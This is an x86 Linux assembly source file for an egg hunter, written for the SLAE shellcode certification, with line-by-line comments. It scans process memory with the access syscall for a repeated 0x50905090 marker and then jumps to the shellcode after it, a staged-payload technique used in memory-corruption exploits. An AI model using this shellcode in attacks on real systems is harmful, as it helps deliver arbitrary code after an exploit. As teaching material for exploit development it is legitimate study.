; Filename: EggHunter.nasm
; Author:  David Alvarez Robles (km0xu95)
; Website:  https://blog.asturhackers.es
;
; Purpose: This assembly file has been created for completing the requirements of the SecurityTube Linux Assembly Expert (SLAE) certification

; Define entry point
global _start			


; Start text section
section .text
_start:

	xor edx, edx	; Clear EDX register

	; Page alignment
	next_page:
		or dx, 0xfff	; Page size is 4096 (0x1000). As adding 0x1000 would add null bytes, a trick is used making an OR with 0xFFF (no nulls) and incrementing EDX by one (next instruction)

	; Address sweep
	next_address:
		inc edx	; Increment memory address by one

	lea ebx, [edx+0x4]	; Loading EDX+4 value on EBX (4 is added to memory address on EDX in order to check 8 bytes per swoop)
	push byte +0x21		; Pushing 33 to stack in order to store it on EAX (33 is access(2) system call)
	pop eax			; Load 33 on EAX in order to make syscall
	int 0x80 		; Calling syscall

	cmp al, 0xf2		; Check if return value was EFAULT
	jz next_page		; If return value was EFAULT, go to next address page

	mov eax, 0x50905090	; If return value was not EFAULT, move egg to EAX register
	mov edi, edx		; Storing current memory address on EDI (copied from EDX)
	scasd			; Comparison between value in EDI and value in EAX (value in memory address to check and egg respectively)
	jnz next_address	; If comparison is not true, go to next memory address to check
	scasd			; If comparison is true, make the comparison again as EDI is EDI+4 after first scasd call (and egg must be 8 bytes long)
	jnz next_address	; If comparison is not true, go to next memory address to check
	jmp edi			; If both comparisons were true, jump to EDI (EDX+8) which holds the shellcode
